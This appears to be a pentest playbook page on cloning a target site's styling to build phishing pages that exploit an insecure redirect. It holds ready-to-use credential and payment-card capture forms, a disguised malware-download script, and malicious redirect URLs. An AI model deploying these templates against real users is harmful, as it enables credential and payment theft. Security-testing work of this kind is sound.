If you can steal the target website's HTML styling, you can use that styling to build a near-clone of the target website that prompts the user to perform some undesirable action. This can include entering SSO credentials, submitting payment information, or downloading "malware". 

This Impact Technique has three steps:
1. Copy the target website's HTML styling.
2. Build a lookalike page that uses the styling and prompts the visitor to do something undesirable.
3. Host the lookalike page on an external server and redirect the user to the page.

# 1. Copy the target website's HTML styling
You can use the developer console to copy the website's `<html>` element as a string. Depending on how the website's frontend is configured, this might also include all of the frontend's CSS and styling. 

First, pick a webpage on the target webpage you would like to emulate. Right-click on that page in your browser and open the Developer Console. Paste the following JavaScript string into the console:
```javascript
document.getElementsByTagName("html")[0]
```


Right-click on the output and select "Copy" > "Copy outerHTML":
![[Pasted image 20240207120826.png|1000]]

Paste this output into a new `.html` file. If you load the file in your browser, it should look identical to the target webpage. If your `.html` file does look identical to the target webpage, you can proceed to **2. Build a lookalike page**.

If, however, your file looks something akin to the following when you load it:
![[Pasted image 20240207121607.png|1000]]

...this means the styling resources are not properly loading. There are a few reasons this might happen:
1. The frontend uses relative URLs (`/style.css`) instead of absolute URLs (`https://target-website.com/style.css`). 
2. The frontend loads resources from external sources in filetypes that are not allowed [per the Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#cross-origin_network_access).

Problem number 1 is fixable. Look through the HTML you copied. If you spot a bunch of relative URLs, try some grep-and-replace magic to see if that helps (e.g., replace all `="/` with `="https://target-website.com/`). It might take a few tries and some manual correction, but you should be able to get it working. 

If you still cannot get your fake page to look like the original, check the Network and Console tabs in the browser. If you see many CORS errors, you are likely encountering problem number 2. Unfortunately, this means you cannot load the website's styling from an external website due to the Same Origin Policy. Move on to the default impact, [[Build Generic Phishing Page]]. 

If you do not see either relative URLs nor CORS errors, then your web page is failing to load resources for some other reason. Looking in the Network tab might give a hint. However, don't spend too long here. It is not worth multiple hours of your time. If you cannot create a convincing clone of the webpage after an hour or two, move to [[Build Generic Phishing Page]].


# 2. Build a lookalike page
Tweak the inner HTML of your cloned `.html` file to add something that prompts the user into performing some undesirable action. You can paste one of the following examples below into your HTML file. The HTML blob should render with the target web page's styling and look fairly convincing:

## SSO Login Form
```html
<form action="/credentials" method="post">
  <div class="container">
    <p><img src="COMPANY-LOGO.png" alt="Avatar" class="avatar" width="50px">Please enter your SSO credentials below:</p>
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <button type="submit">Login</button>
  </div>
</form>
```
- Find an image file of your target website's logo. Save this file to same folder as your `.html` clone.
- Replace `COMPANY-LOGO.png` with the name of this file.
- Tweak manually as necessary.
- This form will send any submitted credentials to the `/credentials` endpoint on your server.

## Malware Prompt
```html
<button onclick="downloadPayload()">
    Download VPN
</button>
<script>
    function base64ToArrayBuffer(base64) {
       var binary_string = window.atob(base64);
       var len = binary_string.length;
       var bytes = new Uint8Array( len );
       for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
       return bytes.buffer;
    }
 
    function downloadPayload() {
        var file = 'BASE-64-PAYLOAD';
        var data = base64ToArrayBuffer(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'vpn';
        
        var a = document.createElement('a');
        document.body.appendChild(a);
        a.style = 'display: none';
        var url = window.URL.createObjectURL(blob);
        a.href = url;
        a.download = fileName
        a.click();
        window.URL.revokeObjectURL(url);
    }
 </script>
```
- Write a stand-in "malware" C program. This can be as simple as a "Hello World" executable.
- Compile your program: `gcc malware.c -o malware`
- Convert your program into a base64 string and copy the string to your clipboard: `cat vpn | base64 | pbcopy`
	- Paste the string into `BASE-64-PAYLOAD` above.
	- Alternatively, you could host the `malware` file as a separate file on the server, but the method above keeps everything in one file.
- When your user clicks the button, it will download the file. 

## Payment/Checkout Form
```html
<div class="payment-title">
    <h1>Payment Information</h1>
    <form action="/payment" method="post">
        <div class="container">
          <p>Please enter your payment information to check out.</p>
          <label for="name"><b>Cardholder Name</b></label>
          <input type="text" name="name" required>
      
          <label for="cardnum"><b>Card Number</b></label>
          <input type="password" name="cardnum" required>
      
          <label for="expiration"><b>Expiration (mm/yy)</b></label>
          <input type="text" name="expiration" required>
      
          <label for="securitycode"><b>Security Code</b></label>
          <input type="password" name="securitycode" required>
      
          <button type="submit">Checkout</button>
        </div>
      </form>
</div>
```
- This will send the user's payment information to the `/payment` endpoint of your server.
- Tweak as needed.
- You might also consider something more involved, like this: https://cdpn.io/quinlo/fullpage/YONMEa?anon=true&view=

# 3. Host the lookalike page on an external server
You need to host your cloned and tweaked `.html` file somewhere. 

For the purposes of a ProdSec PoC, localhost will usually work:
```
cd <folder-containing-html-file>
python -m http.server 8000
```
- Use localhost if you do not have a specific reason to host your file externally. It is better to keep everything off the internet unless needed.
- Your malicious URL would then look something like: `https://target-website.com/insecure-redirect?next=https://localhost:8000/phishing.html`



If you wish to host your file on an external server, you can use the following Flask server in [[Session Token Exfiltration#Flask Server (Automated)]] as a starting point. Note that Flask automatically creates a `/static/<filename>` route that will serve any `filename` file in the `/static` directory. You can place your `.html` file here. 

Your malicious URL would look something akin to:
```
https://target-website.com/insecure-redirect?next=https://external-server-IP/phising.html
```